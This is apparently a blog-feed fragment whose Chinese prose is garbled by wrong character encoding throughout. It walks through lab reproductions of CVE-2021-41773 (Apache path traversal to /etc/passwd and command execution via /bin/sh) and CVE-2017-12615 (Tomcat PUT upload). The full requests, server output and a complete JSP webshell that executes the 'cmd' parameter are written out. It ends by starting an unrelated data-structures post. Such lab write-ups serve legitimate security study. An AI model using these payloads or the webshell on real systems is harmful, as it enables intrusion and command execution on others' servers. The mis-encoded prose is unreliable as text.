-d</span><br></pre></td></tr></table></figure><p>å³å¯æ­å»ºå®Œæˆï¼Œä¹‹åæ ¹æ®å®ƒå¼€æ”¾çš„ ç«¯å£æ¥è®¿é—®è¿™ä¸ªæœåŠ¡ï¼Œ</p><p><img data-src="https://img-blog.csdnimg.cn/direct/847d5ca0e8dc41a383d84062fea18298.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å‡ºç°è¿™ä¸ªé¡µé¢åˆ™è¡¨ç¤ºæ­å»ºæˆåŠŸäº†ï¼Œä¹‹åå°±å¯ä»¥å¼€å§‹äº†ã€‚</p><p>â€‹é¦–å…ˆï¼ŒæŠ“åŒ…ï¼Œç„¶åä¿®æ”¹è¯·æ±‚åŒ…å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</span><br><span class="line">Host: 192.168.209.130:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">If-None-Match: &quot;2d-432a5e4a73a80&quot;</span><br><span class="line">If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¯·æ±‚çš„è·¯å¾„ä¸º /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd , é‚£ä¹ˆï¼Œä¸ºå•¥è¿™ä¸ªè·¯å¾„èƒ½è¡Œå‘¢ï¼Ÿå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcnNzLmNvbS9hcnRpY2xlcy8zNDg5MA==">Apache HTTP Server è·¯å¾„ç©¿è¶Šæ¼æ´ (CVE-2021-41773) åˆ†æå¤ç°</span>ã€‚è¯´ç™½äº†å°±æ˜¯æ²¡æœ‰å¯¹ç›®å½•è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œå¯¼è‡´äº†å¯ä»¥é€ æˆç›®å½•ç©¿è¶Šç›´æ¥è¯»å–æ ¹ç›®å½•çš„æ–‡ä»¶ï¼Œä¸è¿‡ï¼Œæœ‰çš„æ—¶å€™å¯èƒ½å­˜åœ¨ä¸€äº›ä¸ªé—®é¢˜ï¼Œå¯èƒ½éœ€è¦å¯¹ %2e è¿›è¡ŒäºŒæ¬¡ url ç¼–ç ï¼Œè¿™é‡Œåªæ˜¯æä¸€å¥ã€‚</p><p>â€‹å‘é€äº†è¯·æ±‚ä¹‹åæˆ‘ä»¬èƒ½å¤Ÿæ‹¿åˆ°è¿™ä¸ªå›æ˜¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 17 Jun 2024 12:20:37 GMT</span><br><span class="line">Server: Apache/2.4.49 (Unix)</span><br><span class="line">Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT</span><br><span class="line">ETag: &quot;39e-5cceec7356000&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 926</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>â€‹è¯æ˜æˆ‘ä»¬æˆåŠŸäº†ï¼ŒæˆåŠŸè¯»å–äº†æ–‡ä»¶ã€‚</p><p>â€‹éš¾é“ï¼Œåªèƒ½è¿™æ ·äº†å—ï¼Ÿ</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#å‘½ä»¤æ‰§è¡Œ">#</a> å‘½ä»¤æ‰§è¡Œï¼š</h2><p>â€‹å½“ç„¶ä¸æ˜¯ï¼Œåœ¨æœåŠ¡å™¨å¼€å¯ cgi æˆ– cgid æ¨¡å—çš„æƒ…å†µä¸‹ï¼Œè¯¥æ¼æ´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>â€‹å¦‚æœï¼Œå½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶è·¯å¾„ä¸ºï¼š/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh  æ—¶ï¼Œå°±ä¼šå‘ç°ï¼Œæˆ‘ä»¬è¾“å…¥çš„ POST å‚æ•°ä¼šè¢«å½“åšå‘½ä»¤è¿›è¡Œæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç›´æ¥åšåˆ°äº† RCE ã€‚</p><p>â€‹ç»™ä¸ªåŸå› ã€‚</p><blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡ POST ä¼ å…¥çš„ å‚æ•°ï¼Œä¼šä½œä¸º  <code>stdin</code>  çš„å†…å®¹ï¼Œäº¤ç»™ æ‰€è®¿é—®çš„ cgi ç¨‹åºå¤„ç†</p><p>å¦‚æœè®¿é—®çš„æ˜¯  <code>/bin/sh</code>  ï¼Œé‚£ä¹ˆå°±èƒ½ç›´æ¥ getshell äº†</p></blockquote><p>â€‹æˆ‘ä»¬ç»™ POST ä¼ å…¥ï¼ˆå›ºå®šæ ¼å¼ï¼‰ <code>echo Content-Type: text/plain; echo; ls /</code> ï¼Œä¹‹åå°±ä¼šå‘ç°æˆ‘ä»¬æˆåŠŸè¯»å–äº†æ–‡ä»¶ï¼Œæˆ‘æå‰åœ¨æ ¹ç›®å½•å­˜æ”¾äº† flag æ–‡ä»¶ï¼Œå½“ä½œä¸€ä¸ª ctf é¢˜ç›®æ¥è¡¨æ˜æˆ‘ä»¬åšå¯¹äº†è¿™ä¸ªé¢˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 17 Jun 2024 12:50:01 GMT</span><br><span class="line">Server: Apache/2.4.49 (Unix)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæˆ‘ä»¬ POST ä¼ å…¥ï¼š <code>echo Content-Type: text/plain; echo; cat /flag</code> ï¼Œæœ€åèƒ½å¤Ÿæ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 17 Jun 2024 12:52:04 GMT</span><br><span class="line">Server: Apache/2.4.49 (Unix)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">flag&#123;CVE-2021-41773&#125;</span><br></pre></td></tr></table></figure><h1 id="tomcatæ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#tomcatæ–‡ä»¶ä¸Šä¼ ">#</a> Tomcat æ–‡ä»¶ä¸Šä¼ ï¼š</h1><h2 id="å‰ç½®çŸ¥è¯†"><a class="markdownIt-Anchor" href="#å‰ç½®çŸ¥è¯†">#</a> å‰ç½®çŸ¥è¯†ï¼š</h2><p>â€‹<strong>PUT è¯·æ±‚æ˜¯å‘æœåŠ¡å™¨ç«¯å‘é€æ•°æ®çš„ï¼Œä»è€Œæ”¹å˜ä¿¡æ¯</strong>ï¼Œè¯¥è¯·æ±‚å°±åƒæ•°æ®åº“çš„ update æ“ä½œä¸€æ ·ï¼Œç”¨æ¥ä¿®æ”¹æ•°æ®çš„å†…å®¹ï¼Œä½†æ˜¯ä¸ä¼šå¢åŠ æ•°æ®çš„ç§ç±»ç­‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ— è®ºè¿›è¡Œå¤šå°‘æ¬¡ PUT æ“ä½œï¼Œå…¶ç»“æœå¹¶æ²¡æœ‰ä¸åŒã€‚</p><p>â€‹web.xml ä¸»è¦ç”¨æ¥é…ç½® Filterã€Listenerã€Servlet ç­‰ã€‚å½“ readonly æ˜¯ true çš„è¯ï¼Œé‚£ä¹ˆ PUT å’Œ DELETE æ–¹æ³•æ˜¯è¢«æ‹’ç»çš„ï¼Œå› æ­¤å¦‚æœæ‰‹åŠ¨å°† readonly é€‰é¡¹å¼€å¯ä¸º falseï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿé€šè¿‡ PUT æ–¹æ³•ä¸Šä¼ æ–‡ä»¶äº†ã€‚</p><h2 id="æ¼æ´å¤ç°-2"><a class="markdownIt-Anchor" href="#æ¼æ´å¤ç°-2">#</a> æ¼æ´å¤ç°ï¼š</h2><p>â€‹vulhub æ–‡ä»¶å¤¹ä¸­çš„ tomcat çš„ CVE-2017-12615 å°±æ˜¯æ¼æ´å¤ç°çš„ç¯å¢ƒã€‚</p><p>â€‹å¯ä»¥åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­ä½¿ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>æ¥å¯åŠ¨ç¯å¢ƒã€‚</p><p>â€‹è®¿é—®äº†ä¹‹åæ˜¯å¦‚ä¸‹è¿™ä¸ªæƒ…å†µï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/9ff98e223dc349098074ad96f83457fa.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹é‚£ä¹ˆï¼Œé¦–å…ˆæˆ‘ä»¬åœ¨ docker é‡ŒæŸ¥çœ‹æˆ‘ä»¬çš„é¢˜ç›®ç¯å¢ƒæ˜¯æ€ä¹ˆæ ·çš„ï¼Œå¯ä»¥å‘ç° readonly çš„å€¼å°±æ˜¯ falseï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ PUT ä¼ å‚æ¥æ›´æ–°æ–‡ä»¶ï¼Œå¤§æ¦‚ http è¯·æ±‚å¦‚ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.209.130:8080</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-bash"><span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°æ— æ³•ä¸Šä¼ ï¼ŒæŠ¥é”™æ˜¯ 405â€“Method Not Allowedï¼ŒæŸ¥èµ„æ–™è¯´çš„æ˜¯åç¼€ä¸å…è®¸ï¼Œæ‰€ä»¥åœ¨ / 1.jsp åé¢åŠ ä¸Š %20 å†è¯•è¯•ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 204 </span><br><span class="line">Date: Mon, 17 Jun 2024 13:40:05 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>â€‹åº”è¯¥æ˜¯ä¸Šä¼ æˆåŠŸäº†ï¼Œè®¿é—®ä¸‹è¿™ä¸ªæ–‡ä»¶è¯•è¯•ï¼›</p><p><img data-src="https://img-blog.csdnimg.cn/direct/26fdf3232c614210abcf5538ccccad2a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹èƒ½è®¿é—®åˆ°ï¼Œè¯´æ˜è¿™é‡Œå°±ä¸Šä¼ æˆåŠŸäº†ï¼Œé‚£ä¹ˆï¼Œæ¥ä¸‹æ¥ä¸Šä¼  jsp é©¬ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.jsp%20</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.209.130:8080</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>635</span><br><span class="line"></span><br><span class="line"><span class="language-vbscript-html"><span class="language-vbscript">&lt;%@ page import=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"></span><span class="language-vbscript">&lt;%@ page import=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"></span><span class="language-vbscript">&lt;%@ page import=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"></span><span class="language-vbscript">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ä¸€å¥è¯æœ¨é©¬<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"></span><span class="language-vbscript">&lt;%</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">  Process process = Runtime.getRun<span class="built_in">time</span>().exec(<span class="built_in">request</span>.getParameter(<span class="string">&quot;cmd&quot;</span>));</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">  InputStream inputStream = process.getInputStream();</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">  BufferedReader bufferedReader =  <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream));</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">  String line;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">  <span class="keyword">while</span> ((line = bufferedReader.readLine())!=<span class="literal">null</span>)&#123;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">     <span class="built_in">response</span>.getWriter().pr<span class="built_in">int</span>(line);</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">    &#125;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">%&gt;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå¾ˆæ˜æ˜¾å¯ä»¥å¾—çŸ¥æœ¨é©¬çš„å‚æ•°ä¸º cmdï¼Œæ‰€ä»¥è®¿é—®ä¹‹åç›´æ¥ä¼ é€’ cmd çš„å‚æ•°å³å¯æ‰§è¡Œå‘½ä»¤ï¼Œcmd=cat /flagï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/14260754e6a041acb01c6ac27facfab6.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> CVEå¤ç° </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®ç»“æ„-3ã€æ ˆã€é˜Ÿåˆ—å’Œæ•°ç»„</title>
      <link href="/posts/2c763aa6.html"/>
      <url>/posts/2c763aa6.html</url>
      
        <content type="html"><![CDATA[<h1 id="31-æ ˆ"><a class="markdownIt-Anchor" href="#31-æ ˆ">#</a> 3.1ã€æ ˆ</h1><h2 id="311-æ ˆçš„åŸºæœ¬æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#311-æ ˆçš„åŸºæœ¬æ¦‚å¿µ">#</a> 3.1.1ã€æ ˆçš„åŸºæœ¬æ¦‚å¿µï¼š</h2><h3 id="1-æ ˆçš„å®šä¹‰"><a class="markdownIt-Anchor" href="#1-æ ˆçš„å®šä¹‰">#</a> 1ã€æ ˆçš„å®šä¹‰ï¼š</h3><p>â€‹æ ˆæ˜¯åªå…è®¸åœ¨ä¸€ç«¯è¿›è¡Œæ’å…¥æˆ–åˆ é™¤æ“ä½œçš„çº¿æ€§è¡¨ã€‚é¦–å…ˆï¼Œæ ˆæ˜¯ä¸€ç§çº¿æ€§è¡¨ï¼Œä½†é™å®šè¿™ç§çº¿æ€§è¡¨åªèƒ½åœ¨æŸä¸€ç«¯è¿›è¡Œæ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/277222dabf06428490300ed5d9714ed4.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ ˆé¡¶ï¼ˆTopï¼‰ã€‚çº¿æ€§è¡¨å…è®¸è¿›è¡Œæ’å…¥åˆ é™¤çš„é‚£ä¸€ç«¯ã€‚</p><p>â€‹æ ˆåº•ï¼ˆBottomï¼‰ã€‚å›ºå®šçš„ï¼Œä¸å…è®¸è¿›è¡Œæ’å…¥å’Œåˆ é™¤çš„å¦ä¸€ç«¯ã€‚</p><p>â€‹ç©ºæ ˆã€‚ä¸åŒ…å«ä»»ä½•å…ƒç´ çš„ç©ºè¡¨ã€‚</p><p>â€‹å‡è®¾æŸä¸ªæ ˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=(a_1,a_2,a_3,a_4,a_5)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span 